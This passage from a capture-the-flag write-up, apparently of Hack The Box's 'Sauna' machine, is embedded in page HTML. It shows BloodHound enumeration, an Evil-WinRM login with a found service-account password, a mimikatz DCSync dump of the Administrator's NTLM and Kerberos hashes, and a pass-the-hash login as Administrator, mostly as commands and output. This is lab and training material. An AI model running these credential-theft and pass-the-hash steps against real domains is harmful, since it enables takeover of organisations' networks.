</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">computers</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Connecting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">LDAP</span><span class="w"> </span><span class="n">server</span><span class="p">:</span><span class="w"> </span><span class="n">SAUNA.EGOTISTICAL</span><span class="nt">-BANK</span><span class="o">.</span><span class="nf">LOCAL</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="mi">7</span><span class="w"> </span><span class="n">users</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="mi">52</span><span class="w"> </span><span class="n">groups</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">gpos</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">ous</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="mi">19</span><span class="w"> </span><span class="n">containers</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">trusts</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Starting</span><span class="w"> </span><span class="n">computer</span><span class="w"> </span><span class="n">enumeration</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">workers</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Querying</span><span class="w"> </span><span class="n">computer</span><span class="p">:</span><span class="w"> </span><span class="n">SAUNA.EGOTISTICAL</span><span class="nt">-BANK</span><span class="o">.</span><span class="nf">LOCAL</span><span class="w">
</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">Done</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="mi">00</span><span class="n">M</span><span class="w"> </span><span class="nx">24S</span><span class="w">
</span></pre></table></code></div></div><p>Now lets Inspect through bloodhound ‚Üí</p><p><a href="/Vulnhub-Files/img/Sauna/Untitled%201.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Sauna/Untitled%201.png" alt="Untitled" loading="lazy"></a></p><p>But I can‚Äôt have computer session so Lets enumerate further for that I uploaded WinPEAS.exe on the system ‚Üí</p><p>I got credentials :</p><p><a href="/Vulnhub-Files/img/Sauna/Untitled%202.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Sauna/Untitled%202.png" alt="Untitled" loading="lazy"></a></p><p>Since this machine have these users ‚Üí</p><div class="language-powershell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\FSmith\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w">

</span><span class="n">User</span><span class="w"> </span><span class="nx">accounts</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">\\</span><span class="w">

</span><span class="o">-------------------------------------------------------------------------------</span><span class="w">
</span><span class="n">Administrator</span><span class="w">            </span><span class="nx">FSmith</span><span class="w">                   </span><span class="nx">Guest</span><span class="w">
</span><span class="n">HSmith</span><span class="w">                   </span><span class="nx">krbtgt</span><span class="w">                   </span><span class="nx">svc_loanmgr</span><span class="w">
</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">one</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">more</span><span class="w"> </span><span class="nx">errors.</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">svc_loanmgr</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">Moneymakestheworldgoround</span><span class="o">!</span><span class="w">
</span></pre></table></code></div></div><p>Lets have a winrm session with these credentials ‚Üí</p><div class="language-powershell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="err">‚îå‚îÄ‚îÄ</span><span class="p">(</span><span class="n">kali</span><span class="err">„âø</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/Downloads/HTB/Sauna</span><span class="p">]</span><span class="w">
</span><span class="err">‚îî‚îÄ$</span><span class="w"> </span><span class="n">evil</span><span class="nt">-winrm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">175</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="n">svc_loanmgr</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s1">'Moneymakestheworldgoround!'</span><span class="w">
                                        
</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">v3.</span><span class="mi">5</span><span class="w">
                                        
</span><span class="n">Warning</span><span class="p">:</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">completions</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">disabled</span><span class="w"> </span><span class="n">due</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">ruby</span><span class="w"> </span><span class="n">limitation</span><span class="p">:</span><span class="w"> </span><span class="n">quoting_detection_proc</span><span class="p">()</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">unimplemented</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">machine</span><span class="w">
                                        
</span><span class="n">Data</span><span class="p">:</span><span class="w"> </span><span class="n">For</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">information</span><span class="p">,</span><span class="w"> </span><span class="n">check</span><span class="w"> </span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="w"> </span><span class="n">GitHub</span><span class="p">:</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="n">//github.com/Hackplayers/evil-winrm</span><span class="c">#Remote-path-completion</span><span class="w">
                                        
</span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">Establishing</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="n">endpoint</span><span class="w">
</span><span class="o">*</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C:\Users\svc_loanmgr\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span><span class="n">egotisticalbank\svc_loanmgr</span><span class="w">
</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_loanmgr\Documents</span><span class="err">&gt;</span><span class="w">
</span><span class="o">*</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C:\Users\svc_loanmgr\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">
</span><span class="o">*</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C:\Users\svc_loanmgr\Documents</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><p>Through Bloodhound I again collect the data as previous way and uploaded to bloodhound dashboad , Now ‚Üí</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/Downloads/HTB/Sauna]
‚îî‚îÄ<span class="nv">$ </span>python3 /opt/Tools/BloodHound.py/bloodhound.py <span class="nt">-d</span> <span class="s1">'EGOTISTICAL-BANK.LOCAL'</span> <span class="nt">-u</span> svc_loanmgr <span class="nt">-p</span> <span class="s1">'Moneymakestheworldgoround!'</span> <span class="nt">-ns</span> 10.10.10.175 <span class="nt">-c</span> all
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT <span class="k">for </span>user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="o">[</span>Errno Connection error <span class="o">(</span>SAUNA.EGOTISTICAL-BANK.LOCAL:88<span class="o">)]</span> <span class="o">[</span>Errno <span class="nt">-2</span><span class="o">]</span> Name or service not known
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 7 <span class="nb">users
</span>INFO: Found 52 <span class="nb">groups
</span>INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done <span class="k">in </span>00M 29S
</pre></table></code></div></div><p><a href="/Vulnhub-Files/img/Sauna/Untitled%203.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Sauna/Untitled%203.png" alt="Untitled" loading="lazy"></a></p><p>For <strong>DCSync</strong> Permission Abuse I need to upload mimikatz Tool ‚Üí</p><div class="language-powershell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_loanmgr\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">upload</span><span class="w"> </span><span class="o">..</span><span class="nx">/../../../../../opt/Tools/mimikatz.exe</span><span class="w">
</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_loanmgr\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\mimikatz</span><span class="w"> </span><span class="s2">"lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator"</span><span class="w"> </span><span class="nx">exit</span><span class="w">

  </span><span class="s1">'.#####.'</span><span class="w">   </span><span class="n">mimikatz</span><span class="w"> </span><span class="nx">2.2.0</span><span class="w"> </span><span class="p">(</span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="c">#18362 Feb 29 2020 11:13:36</span><span class="w">
 </span><span class="s1">'.## ^ ##.'</span><span class="w">  </span><span class="s2">"A La Vie, A LAmour"</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">(</span><span class="n">oe.eo</span><span class="p">)</span><span class="w">
 </span><span class="s1">'## / \ ##'</span><span class="w">  </span><span class="n">/</span><span class="o">***</span><span class="w"> </span><span class="nx">Benjamin</span><span class="w"> </span><span class="nx">DELPY</span><span class="w"> </span><span class="se">`g</span><span class="nx">entilkiwi</span><span class="se">` </span><span class="p">(</span><span class="w"> </span><span class="n">benjamin</span><span class="err">@</span><span class="nx">gentilkiwi.com</span><span class="w"> </span><span class="p">)</span><span class="w">
 </span><span class="s1">'## \ / ##'</span><span class="w">       </span><span class="err">&gt;</span><span class="w"> </span><span class="n">http://blog.gentilkiwi.com/mimikatz</span><span class="w">
  </span><span class="s1">'## v ##'</span><span class="w">       </span><span class="nx">Vincent</span><span class="w"> </span><span class="nx">LE</span><span class="w"> </span><span class="nx">TOUX</span><span class="w">             </span><span class="p">(</span><span class="w"> </span><span class="n">vincent.letoux</span><span class="err">@</span><span class="nx">gmail.com</span><span class="w"> </span><span class="p">)</span><span class="w">
   </span><span class="s1">'#####'</span><span class="w">        </span><span class="err">&gt;</span><span class="w"> </span><span class="n">http://pingcastle.com</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">http://mysmartlogon.com</span><span class="w">   </span><span class="o">***</span><span class="nx">/</span><span class="w">

</span><span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span><span class="w"> </span><span class="c"># lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator</span><span class="w">
</span><span class="p">[</span><span class="n">DC</span><span class="p">]</span><span class="w"> </span><span class="s1">'EGOTISTICAL-BANK.LOCAL'</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">domain</span><span class="w">
</span><span class="p">[</span><span class="n">DC</span><span class="p">]</span><span class="w"> </span><span class="s1">'SAUNA.EGOTISTICAL-BANK.LOCAL'</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">DC</span><span class="w"> </span><span class="nx">server</span><span class="w">
</span><span class="p">[</span><span class="n">DC</span><span class="p">]</span><span class="w"> </span><span class="s1">'Administrator'</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">account</span><span class="w">

</span><span class="n">Object</span><span class="w"> </span><span class="nx">RDN</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">Administrator</span><span class="w">

</span><span class="o">**</span><span class="w"> </span><span class="n">SAM</span><span class="w"> </span><span class="nx">ACCOUNT</span><span class="w"> </span><span class="o">**</span><span class="w">

</span><span class="n">SAM</span><span class="w"> </span><span class="nx">Username</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">Administrator</span><span class="w">
</span><span class="n">Account</span><span class="w"> </span><span class="nx">Type</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">30000000</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">USER_OBJECT</span><span class="w"> </span><span class="p">)</span><span class="w">
</span><span class="n">User</span><span class="w"> </span><span class="nx">Account</span><span class="w"> </span><span class="nx">Control</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">00010200</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">NORMAL_ACCOUNT</span><span class="w"> </span><span class="nx">DONT_EXPIRE_PASSWD</span><span class="w"> </span><span class="p">)</span><span class="w">
</span><span class="n">Account</span><span class="w"> </span><span class="nx">expiration</span><span class="w">   </span><span class="p">:</span><span class="w">
</span><span class="n">Password</span><span class="w"> </span><span class="nx">last</span><span class="w"> </span><span class="nx">change</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">7/26/2021</span><span class="w"> </span><span class="nx">8:16:16</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">Object</span><span class="w"> </span><span class="nx">Security</span><span class="w"> </span><span class="nx">ID</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-2966785786-3096785034-1186376766-500</span><span class="w">
</span><span class="n">Object</span><span class="w"> </span><span class="nx">Relative</span><span class="w"> </span><span class="nx">ID</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">500</span><span class="w">

</span><span class="n">Credentials:</span><span class="w">
  </span><span class="nx">Hash</span><span class="w"> </span><span class="nx">NTLM:</span><span class="w"> </span><span class="nx">823452073d75b9d1cf70ebdf86c7f98e</span><span class="w">
    </span><span class="n">ntlm-</span><span class="w"> </span><span class="nx">0:</span><span class="w"> </span><span class="nx">823452073d75b9d1cf70ebdf86c7f98e</span><span class="w">
    </span><span class="n">ntlm-</span><span class="w"> </span><span class="nx">1:</span><span class="w"> </span><span class="nx">d9485863c1e9e05851aa40cbb4ab9dff</span><span class="w">
    </span><span class="n">ntlm-</span><span class="w"> </span><span class="nx">2:</span><span class="w"> </span><span class="nx">7facdc498ed1680c4fd1448319a8c04f</span><span class="w">
    </span><span class="n">lm</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nx">0:</span><span class="w"> </span><span class="nx">365ca60e4aba3e9a71d78a3912caf35c</span><span class="w">
    </span><span class="n">lm</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nx">1:</span><span class="w"> </span><span class="nx">7af65ae5e7103761ae828523c7713031</span><span class="w">

</span><span class="n">Supplemental</span><span class="w"> </span><span class="nx">Credentials:</span><span class="w">
</span><span class="o">*</span><span class="w"> </span><span class="n">Primary:NTLM-Strong-NTOWF</span><span class="w"> </span><span class="o">*</span><span class="w">
    </span><span class="n">Random</span><span class="w"> </span><span class="nx">Value</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">716dbadeed0e537580d5f8fb28780d44</span><span class="w">

</span><span class="o">*</span><span class="w"> </span><span class="n">Primary:Kerberos-Newer-Keys</span><span class="w"> </span><span class="o">*</span><span class="w">
    </span><span class="n">Default</span><span class="w"> </span><span class="nx">Salt</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">EGOTISTICAL-BANK.LOCALAdministrator</span><span class="w">
    </span><span class="n">Default</span><span class="w"> </span><span class="nx">Iterations</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">4096</span><span class="w">
    </span><span class="n">Credentials</span><span class="w">
      </span><span class="nx">aes256_hmac</span><span class="w">       </span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">42</span><span class="n">ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657</span><span class="w">
      </span><span class="nx">aes128_hmac</span><span class="w">       </span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">a9f3769c592a8a231c3c972c4050be4e</span><span class="w">
      </span><span class="nx">des_cbc_md5</span><span class="w">       </span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">fb8f321c64cea87f</span><span class="w">
    </span><span class="nx">OldCredentials</span><span class="w">
      </span><span class="n">aes256_hmac</span><span class="w">       </span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">987</span><span class="n">e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031</span><span class="w">
      </span><span class="nx">aes128_hmac</span><span class="w">       </span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">145</span><span class="n">e4d0e4a6600b7ec0ece74997651d0</span><span class="w">
      </span><span class="nx">des_cbc_md5</span><span class="w">       </span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">19</span><span class="n">d5f15d689b1ce5</span><span class="w">
    </span><span class="nx">OlderCredentials</span><span class="w">
      </span><span class="n">aes256_hmac</span><span class="w">       </span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">9637</span><span class="n">f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef</span><span class="w">
      </span><span class="nx">aes128_hmac</span><span class="w">       </span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">52</span><span class="n">c02b864f61f427d6ed0b22639849df</span><span class="w">
      </span><span class="nx">des_cbc_md5</span><span class="w">       </span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">d9379d13f7c15d1c</span><span class="w">

</span><span class="o">*</span><span class="w"> </span><span class="n">Primary:Kerberos</span><span class="w"> </span><span class="o">*</span><span class="w">
    </span><span class="n">Default</span><span class="w"> </span><span class="nx">Salt</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">EGOTISTICAL-BANK.LOCALAdministrator</span><span class="w">
    </span><span class="n">Credentials</span><span class="w">
      </span><span class="nx">des_cbc_md5</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">fb8f321c64cea87f</span><span class="w">
    </span><span class="n">OldCredentials</span><span class="w">
      </span><span class="nx">des_cbc_md5</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">19d5f15d689b1ce5</span><span class="w">

</span><span class="o">*</span><span class="w"> </span><span class="n">Packages</span><span class="w"> </span><span class="o">*</span><span class="w">
    </span><span class="n">NTLM-Strong-NTOWF</span><span class="w">

</span><span class="o">*</span><span class="w"> </span><span class="n">Primary:WDigest</span><span class="w"> </span><span class="o">*</span><span class="w">
    </span><span class="mi">01</span><span class="w">  </span><span class="n">b4a06d28f92506a3a336d97a66b310fa</span><span class="w">
    </span><span class="nx">02</span><span class="w">  </span><span class="nx">71efaf133c578bd7428bd2e1eca5a044</span><span class="w">
    </span><span class="mi">03</span><span class="w">  </span><span class="mi">974</span><span class="n">acf4f67e4f609eb032fd9a72e8714</span><span class="w">
    </span><span class="nx">04</span><span class="w">  </span><span class="nx">b4a06d28f92506a3a336d97a66b310fa</span><span class="w">
    </span><span class="mi">05</span><span class="w">  </span><span class="mi">79</span><span class="n">ba561a664d78d6242748774e8475c5</span><span class="w">
    </span><span class="nx">06</span><span class="w">  </span><span class="nx">f1188d8ed0ca1998ae828a60a8c6ac29</span><span class="w">
    </span><span class="mi">07</span><span class="w">  </span><span class="mi">801</span><span class="n">ddc727db9fa3de98993d88a9ffa8b</span><span class="w">
    </span><span class="nx">08</span><span class="w">  </span><span class="nx">a779e05da837dd2d303973304869ec0f</span><span class="w">
    </span><span class="mi">09</span><span class="w">  </span><span class="n">ac2c01846aebce4cbd4e3ec69b47a65d</span><span class="w">
    </span><span class="nx">10</span><span class="w">  </span><span class="nx">6d863d6ae06c3addc49b7a453afe6fa0</span><span class="w">
    </span><span class="mi">11</span><span class="w">  </span><span class="n">a779e05da837dd2d303973304869ec0f</span><span class="w">
    </span><span class="nx">12</span><span class="w">  </span><span class="nx">6676b9fdd4aa7f298f1ada64c044c230</span><span class="w">
    </span><span class="mi">13</span><span class="w">  </span><span class="mi">5</span><span class="n">a01167d750636d66e5602db9aece9b7</span><span class="w">
    </span><span class="nx">14</span><span class="w">  </span><span class="nx">f702282bd343c2fee7b98deac8950390</span><span class="w">
    </span><span class="mi">15</span><span class="w">  </span><span class="n">a099aa3c81f1affeba59d79a6533f60d</span><span class="w">
    </span><span class="nx">16</span><span class="w">  </span><span class="nx">4bae84b8f0b0306788ff9bda4acb3bd4</span><span class="w">
    </span><span class="mi">17</span><span class="w">  </span><span class="mi">976</span><span class="n">d547fb9e04b0ac5ec60508c275da1</span><span class="w">
    </span><span class="nx">18</span><span class="w">  </span><span class="nx">50c302b71d0e08a1a2be14b56225645f</span><span class="w">
    </span><span class="mi">19</span><span class="w">  </span><span class="n">edb19e08653443695f6d3599e0a6bddf</span><span class="w">
    </span><span class="nx">20</span><span class="w">  </span><span class="nx">c497465ddc6e2fc14cb0359d0d5de7f8</span><span class="w">
    </span><span class="mi">21</span><span class="w">  </span><span class="mi">2</span><span class="n">ed0b4b57196fb190a66224b2b17029f</span><span class="w">
    </span><span class="nx">22</span><span class="w">  </span><span class="nx">37d03051ae1cd6046975948564ab01fa</span><span class="w">
    </span><span class="mi">23</span><span class="w">  </span><span class="n">d4c7554fe1beb0ed712f50cfec470471</span><span class="w">
    </span><span class="nx">24</span><span class="w">  </span><span class="nx">8df495fe69cdce409b9f04ea04289b9e</span><span class="w">
    </span><span class="mi">25</span><span class="w">  </span><span class="mi">40788044</span><span class="n">be982310920cc0740687fefd</span><span class="w">
    </span><span class="nx">26</span><span class="w">  </span><span class="nx">db7f66f1f1a8f46274d20cfdda5b6e1c</span><span class="w">
    </span><span class="mi">27</span><span class="w">  </span><span class="n">d70226ec52f1ef198c2e1e955a1da9b6</span><span class="w">
    </span><span class="nx">28</span><span class="w">  </span><span class="nx">abdd681f875a9b3f3a50b36e51692a2c</span><span class="w">
    </span><span class="mi">29</span><span class="w">  </span><span class="n">dcd140a2ce2bf70fed7ac0e2b60d0dee</span><span class="w">

</span><span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span><span class="w"> </span><span class="c"># exit</span><span class="w">
</span><span class="n">Bye</span><span class="o">!</span><span class="w">
</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_loanmgr\Documents</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><p>Lets have a Adminstrators session now with ntlm hash ‚Üí</p><div class="language-powershell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="err">‚îå‚îÄ‚îÄ</span><span class="p">(</span><span class="n">kali</span><span class="err">„âø</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/Downloads/HTB/Sauna</span><span class="p">]</span><span class="w">
</span><span class="err">‚îî‚îÄ$</span><span class="w"> </span><span class="n">evil</span><span class="nt">-winrm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">175</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="n">Administrator</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="mi">823452073</span><span class="n">d75b9d1cf70ebdf86c7f98e</span><span class="w">
                                        
</span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">v3.</span><span class="mi">5</span><span class="w">
                                        
</span><span class="n">Warning</span><span class="p">:</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">completions</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">disabled</span><span class="w"> </span><span class="n">due</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">ruby</span><span class="w"> </span><span class="n">limitation</span><span class="p">:</span><span class="w"> </span><span class="n">quoting_detection_proc</span><span class="p">()</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">unimplemented</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">machine</span><span class="w">
                                        
</span><span class="n">Data</span><span class="p">:</span><span class="w"> </span><span class="n">For</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">information</span><span class="p">,</span><span class="w"> </span><span class="n">check</span><span class="w"> </span><span class="n">Evil</span><span class="nt">-WinRM</span><span class="w"> </span><span class="n">GitHub</span><span class="p">:</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="n">//github.com/Hackplayers/evil-winrm</span><span class="c">#Remote-path-completion</span><span class="w">
                                        
